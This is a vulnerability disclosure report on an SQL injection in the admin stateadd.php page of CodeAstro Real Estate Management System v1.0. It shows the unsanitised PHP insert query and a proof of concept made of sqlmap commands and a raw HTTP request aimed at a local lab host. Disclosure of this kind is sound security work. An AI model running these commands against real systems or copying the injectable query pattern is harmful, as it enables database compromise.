# SQLi in CodeAstro Real Estate Management System v1.0 of file /admin/stateadd.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /admin/stateadd.php

**Version**

- V1.0

### Analyse

```php
<?php
session_start();
require("config.php"); 
if(!isset($_SESSION['auser']))
{
	header("location:index.php");
}
///code
$error="";
$msg="";
if(isset($_POST['insert']))
{
	$state=$_POST['state'];
	
	if(!empty($state)){
		$sql="insert into state (sname) values('$state')";
		$result=mysqli_query($con,$sql);
		if($result)
			{
				$msg="<p class='alert alert-success'>State Inserted Successfully</p>";
						
			}
			else
			{
				$error="<p class='alert alert-warning'>* State Not Inserted</p>";
			}
	}
	else{
		$error = "<p class='alert alert-warning'>* Fill all the Fields</p>";
	}
	
}
?>
```



![image-20251215204225611](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512152044106.png)

### POC

```bash
sqlmap -u "http://192.168.93.1/RealEstate/admin/stateadd.php" --data="state=test&insert=Submit" --cookie="PHPSESSID=q8vu4tgrhj01ikmjm3u469chil" --level=2 --thread=10 --batch --flush-session
```

![image-20251212093240140](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512120932218.png)

```bash
sqlmap -r D:/XU/tools/Yakit1/yakit-projects/temp/yak-1827717910.tmp -p state --dbms=mysql --batch
```



```http
POST /RealEstate-PHP/admin/stateadd.php HTTP/1.1
Host: 192.168.93.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Origin: http://192.168.93.1
Content-Type: multipart/form-data; boundary=----geckoformboundarye0541732a9a4cf3c2eaf5125fcd494fc
Referer: http://192.168.93.1/RealEstate-PHP/admin/stateadd.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Cookie: PHPSESSID=q8vu4tgrhj01ikmjm3u469chil
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept-Encoding: gzip, deflate
Content-Length: 281

------geckoformboundarye0541732a9a4cf3c2eaf5125fcd494fc
Content-Disposition: form-data; name="state"

1
------geckoformboundarye0541732a9a4cf3c2eaf5125fcd494fc
Content-Disposition: form-data; name="insert"

Submit
------geckoformboundarye0541732a9a4cf3c2eaf5125fcd494fc--
```

![image-20251212093250723](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512120932807.png)